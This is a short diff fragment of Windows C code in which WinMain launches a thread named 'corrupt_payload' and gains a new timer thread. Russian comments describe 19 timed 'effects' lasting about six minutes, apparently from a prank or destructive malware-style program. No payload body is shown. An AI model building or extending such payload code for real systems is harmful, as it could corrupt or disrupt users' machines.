@@ -1059,6 +1059,7 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     CreateThread(0, 0, corrupt_payload, 0, 0, 0);
     Sleep(1000);
+    CreateThread(0, 0, TimerThread, 0, 0, 0);
 
     // ====== ВСЕ ЭФФЕКТЫ ПО 20 СЕКУНД ======
     // Всего 19 эффектов × 20 сек = 380 сек = ~6 минут 20 секунд
